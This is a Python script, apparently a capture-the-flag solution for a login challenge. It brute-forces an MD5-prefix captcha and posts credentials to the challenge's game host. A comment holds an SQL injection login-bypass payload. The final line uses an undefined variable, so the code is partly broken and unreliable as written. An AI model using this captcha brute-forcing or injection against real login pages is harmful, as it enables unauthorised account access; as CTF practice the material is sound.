#bctf 17/3/15 登陆题 md5验证码
#python 3.5

import requests
import hashlib
import re

username = 'HEL1OW10rDEvery0n3'
url = 'http://e82c124941e241508c05baab30b26bfd9fe135e93948463f.ctf.game/3712901a08bb58557943ca31f3487b7d/action.php?action=login'

url_session = requests.session()
a = url_session.get(url)
t = re.search('substr(.*?)=(.*?)<div class="box">', a.text)
cap = t.group(2)
print(cap)

captcha_md5 = ''
username_md5 = hashlib.md5(username.encode()).hexdigest()

for i in range(99999999):
    # str(i).encode()
    md5_1 = hashlib.md5(str(i).encode())
    b = md5_1.hexdigest()
    if b[0:6] == cap:
        captcha_md5 = b
        print('{}: {}'.format(i, b))
        break

if captcha_md5 != '':
    body = {
        #'username': "admin' or '1' = '1"
        'username': str(username_md5),
        'password': "12345678",
        'captcha_md5': str(i),  #!!!!!改成str(i)后可过
        'submit': "Submit"
    }
    print(body)

    get = url_session.post(url, data=body, json=body)
    print(get.text)
else:
    print('failed!')

print('usedtime: {}s'.format(interval))